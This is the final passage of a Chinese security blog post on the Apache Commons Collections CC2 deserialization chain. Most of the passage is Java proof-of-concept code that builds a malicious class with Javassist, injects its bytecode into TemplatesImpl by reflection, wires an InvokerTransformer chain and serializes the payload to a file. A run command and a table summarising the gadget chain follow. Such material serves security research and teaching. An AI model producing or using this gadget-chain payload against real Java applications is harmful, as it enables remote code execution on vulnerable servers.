+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>domClass</span><span class=p>,</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;java.lang.Object[]&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>},</span><span class=w> </span><span class=n>evilClass</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>method2</span><span class=p>.</span><span class=na>setModifiers</span><span class=p>(</span><span class=n>AccessFlag</span><span class=p>.</span><span class=na>PUBLIC</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>method2</span><span class=p>.</span><span class=na>setBody</span><span class=p>(</span><span class=s>&#34;{}&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>evilClass</span><span class=p>.</span><span class=na>addMethod</span><span class=p>(</span><span class=n>method2</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytecode</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>evilClass</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;    [+] 字节码大小: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>bytecode</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34; 字节&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>bytecode</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 创建 TemplatesImpl 实例
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * @param evilBytes 恶意类的字节码
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * @return 配置好的 TemplatesImpl 实例
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=w> </span><span class=nf>createTemplatesImpl</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>evilBytes</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TemplatesImpl</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 设置 _bytecodes</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>bytecodesField</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_bytecodes&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>bytecodesField</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>bytecodesField</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>evilBytes</span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 设置 _name</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>nameField</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_name&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>nameField</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>nameField</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;anything&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 设置 _tfactory（必须）</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>tfactoryField</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_tfactory&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>tfactoryField</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>tfactoryField</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerFactoryImpl</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;    [+] TemplatesImpl 创建成功&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>templates</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 创建 Transformer 链
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * @param templates TemplatesImpl 实例
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * @return ChainedTransformer 实例
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=w> </span><span class=nf>createTransformerChain</span><span class=p>(</span><span class=n>TemplatesImpl</span><span class=w> </span><span class=n>templates</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>templates</span><span class=p>),</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;newTransformer&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{})</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ChainedTransformer</span><span class=w> </span><span class=n>chainedTransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>transformers</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;    [+] Transformer 链长度: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>transformers</span><span class=p>.</span><span class=na>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>chainedTransformer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 序列化对象到文件
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * @param obj      要序列化的对象
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * @param filename 输出文件名
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>filename</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>(</span><span class=n>FileOutputStream</span><span class=w> </span><span class=n>fos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>             </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>fos</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>oos</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] 序列化完成: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>filename</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><p>复现命令</p><p>mvn exec:java &ldquo;-Dexec.mainClass=cc2.CC2AllInOne&rdquo;</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260613161057317.png alt=image.png loading=lazy decoding=async></figure></p><h2 id=总结>总结</h2><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>PriorityQueue</td><td>反序列化入口</td><td>readObject() → heapify() → siftDown()</td></tr><tr><td>TransformingComparator</td><td>触发 Transformer 链</td><td>compare() → transform()</td></tr><tr><td>ChainedTransformer</td><td>组合多个 Transformer</td><td>transform()</td></tr><tr><td>InvokerTransformer</td><td>反射调用方法</td><td>transform() → Method.invoke()</td></tr><tr><td>ConstantTransformer</td><td>返回常量值</td><td>transform()</td></tr><tr><td>TemplatesImpl</td><td>加载恶意字节码</td><td>newTransformer() → defineClass()</td></tr><tr><td>AbstractTranslet</td><td>恶意类的父类</td><td>必须继承</td></tr></tbody></table></div><div class=single-tags><a href=/tags/java%E5%AE%89%E5%85%A8/># Java安全</a>
+<a href=/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/># 安全研究</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
